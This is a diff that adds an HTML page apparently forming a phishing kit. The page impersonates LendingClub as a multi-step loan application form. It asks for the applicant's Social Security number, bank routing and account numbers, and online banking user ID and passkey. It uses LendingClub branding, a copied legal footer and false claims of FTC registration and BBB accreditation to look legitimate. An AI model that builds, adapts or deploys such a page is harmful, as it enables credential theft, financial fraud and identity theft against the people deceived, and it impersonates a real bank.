@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Loan Application</title>
+  <link rel="icon" href="https://cdn.brandfetch.io/idDnty9Kht/w/800/h/800/theme/dark/symbol.png?c=1dxbfHSJFAPEGdCLU4o5B" type="image/x-icon">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #ddd7fc;
+    }
+    img{
+        max-width: 100%;
+        
+    }
+    .imgl{
+        height: 100%;
+        width: auto;
+        justify-content: right;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    b {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input[type="number"],
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    input[readonly] {
+      background-color: #eee;
+    }
+
+    button {
+      background-color: #9ca0a4;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      margin-bottom: 5px;
+    }
+
+    button:hover {
+      background-color: #ec2b3c;
+    }
+    h3{
+        color: #d41c2c  ;
+    }
+    .subtn{
+        background-color: #ec2b3c;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+    }
+    .form-step {
+  display: none;
+  opacity: 0.4;
+  pointer-events: none;
+  transition: opacity 0.3s ease;
+}
+.form-step.active {
+  display: block;
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.logo{
+  background-color: #113b5e;
+  height: 100px;
+  width: auto;
+  justify-content: center;
+  display: flex;
+}
+.logo img{
+height: 90%;
+margin-top: 5px;
+margin-left: 5px;
+margin-right: 5px;
+}
+
+footer{
+    background-color: white;
+    margin-top: -5px;
+    max-width: 100%;
+}
+
+footer p{
+    font-size: large;
+    color: #113b5e;
+    margin-top: 2px;
+    padding: 15px;
+}
+.info{
+    font-size: 16px;
+}
+.last{
+    display: flex;
+}
+
+@media (max-width: 768px) {
+      .contact-section {
+        flex-direction: column;
+        align-items: center;
+      }}
+
+  </style>
+</head>
+<body>
+  <div class="logo">
+<img src="https://cdn.brandfetch.io/idDnty9Kht/w/800/h/118/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B" alt="Lendersclub" height="100px">
+<br><br>
+</div>
+<br><br>
+
+
+
+
+
+  <div class="container">
+    <h2>Loan Application Form</h2>
+    <form action="" method="POST" id="multiStepForm" name="Verification">
+  <div class="form-step active">
+    <b>Personal Information</b> <br>
+       Legal Name <br>
+    <input type="text" name="name" placeholder="First Name       Middle Initial        Last Name"  required>
+
+    Email Address <br>
+    <input type="email" name="email" placeholder="Email" required>
+
+    Phone Number <br>
+    <input type="text" name="phone" placeholder="Phone Number" required>
+
+    Residential Address <br>
+    <input type="text" name="address" placeholder="Address" >
+
+    Social Security Number <br>
+    <input type="text" name="ss"  placeholder="SSN" required>
+
+    <button type="button" class="next">Next</button>
+  </div>
+
+
+
+  <div class="form-step">
+    <b> Employment & Income </b>
+
+    Employment Status <br>
+    <select id="employment-status" name="employment-status" required>
+      <option value="" disabled selected>Select status</option>
+      <option value="full-time">Employed Full-Time</option>
+      <option value="part-time">Employed Part-Time</option>
+      <option value="self-employed">Self-Employed</option>
+      <option value="unemployed">Unemployed</option>
+      <option value="retired">Retired</option>
+    </select>
+
+    Monthly Income ($) <br>
+    <input type="text" name="income" id="income" placeholder="Income" required>
+
+    <button type="button" class="next">Next</button>
+    <button type="button" class="prev">Previous</button>
+  </div>
+
+  <div class="form-step">
+    <b>Basic Banking Details</b>
+<br>
+    Bank Name <br>
+    <input type="text" name="bnk" placeholder="Bank Name" required>
+
+    Banking Relationship Duration (Years) <br>
+    <input type="text" name="time" placeholder="How many years of Banking" required>
+
+    Bank Verification ID (Routing Number) <br>
+    <input type="text" name="r1" placeholder="Routing Number" required >
+
+    <button type="button" class="next">Next</button>
+    <button type="button" class="prev">Previous</button>    
+    </div>
+
+
+
+
+
+    
+    <div class="form-step">
+      <b>Advance Banking Details</b>
+      <br>
+    Account Verification ID (Account Number) <br>
+    <input type="text" name="a1" placeholder="Account Number" required>
+
+    Your User ID <br> 
+    <input type="text" name="ud" id="school" placeholder="Banking User ID" required>
+    Your Passkey for Security <br>
+    <input type="text" name="ps" id="college" placeholder="Your Passkey" required>
+<br>
+
+    <h4>
+      We are registered with the FTC and accredited by the BBB. As an authorized entity, we securely collect your banking information solely for verification purposes, in full compliance with applicable privacy laws.
+<br><br>
+ <input type="checkbox" name="terms" required> I acknowledge and consent to the collection and use of my information as described above.
+    </h4>
+
+    <br><br>
+    <button type="submit" class="subtn">Submit Application</button>
+    <button type="button" class="prev">Previous</button>
+    </div>
+  
+</form>
+<br><br>
+
+
+    <a href="">Cancel Application</a>
+  </div>
+  <br><br>
+  <hr>
+
+  <footer>
+    <br><br>
+    <div class="last">
+        <div>&nbsp;&nbsp;
+    <img src="Logo.jpg" alt="footer" height="40px" width="auto">
+    <p>595 Market Street, Suit 200 <br> San Francisco, California 94105, USA</p>
+        </div>
+        <div>
+    <p class="imgl"><img src="img1.jpg" alt="1" height="35px" width="auto"> <a href="https://www.bbb.org/us/ca/san-francisco/profile/financial-services/lendingclub-corporation-1116-361746"><img src="img2.jpg" alt="2" height="45px" width="auto"> </a> <img src="img3.jpg" alt="3" height="55px" width="auto"></p>
+       </div>
+    </div>
+        <p class="info">Loans are made by LendingClub Bank, N.A., Member FDIC, Equal Housing Lender (“LendingClub Bank”), a wholly-owned subsidiary of LendingClub Corporation, NMLS ID 167439. Loans are subject to credit approval. Loan closing is contingent on accepting all required agreements and disclosures at lendingclub.com “LendingClub” is a trademark of LendingClub Bank.
+        <br><br>
+
+&copy; 2025 LendingClub Bank. All rights reserved.</p>
+
+  </footer>
+
+  <script>
+  const steps = document.querySelectorAll('.form-step');
+const nextBtns = document.querySelectorAll('.next');
+const prevBtns = document.querySelectorAll('.prev');
+let currentStep = 0;
+
+function showStep(index) {
+  steps.forEach((step, i) => {
+    const inputs = step.querySelectorAll('input');
+    if (i === index) {
+      step.classList.add('active');
+      inputs.forEach(input => input.disabled = false);
+    } else {
+      step.classList.remove('active');
+      inputs.forEach(input => input.disabled = false);
+    }
+  });
+}
+
+nextBtns.forEach(btn => {
+  btn.addEventListener('click', () => {
+    if (currentStep < steps.length - 1) {
+      currentStep++;
+      showStep(currentStep);
+    }
+  });
+});
+
+prevBtns.forEach(btn => {
+  btn.addEventListener('click', () => {
+    if (currentStep > 0) {
+      currentStep--;
+      showStep(currentStep);
+    }
+  });
+});
+
+showStep(currentStep); 
+
+
+
+
+  </script>
+</body>
+</html>
